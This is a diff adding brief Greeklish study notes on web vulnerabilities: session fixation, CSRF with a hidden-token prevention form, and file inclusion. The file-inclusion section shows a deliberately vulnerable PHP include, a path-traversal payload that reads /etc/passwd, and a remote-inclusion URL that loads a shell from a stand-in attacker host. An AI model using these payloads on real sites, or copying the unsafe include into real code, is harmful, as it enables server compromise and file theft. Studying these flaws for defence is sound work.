@@ -1,0 +1,49 @@
+##  SESSION FIXATION 
+
+Otan ena site den dinei neo SESSID  prin kai meta to login , tote pithanon na einai eupathi
+Sugkrinontas to SESSID prin kai meta to login, ean einai ta idia , tote exoume pithanh eupathia
+
+
+
+## CSRF or XSRF 
+
+H dunatothta na metamorfosoume ena request 
+
+Preventing example : 
+
+<form action=”adduser.php” method=”POST”>
+<input type=”text” name=”username”/>
+...
+<input type=”hidden” name=”token”
+value=”eb4f130331f9b0a25360975d7d565a76”
+...
+</form>
+
+
+
+## FILE INCLUSION "rfi-lfi"
+
+^LFI^ {
+$ code example
+
+<?php
+include(“/html/” . $_GET[‘path’]);
+?>
+
+
+* url.php?path=../../../../../etc/passwd
+}
+
+^RFI^ {
+
+url.php?page=http://attackersite/shell.txt?
+}
+
+
+
+
+
+
+
+
+
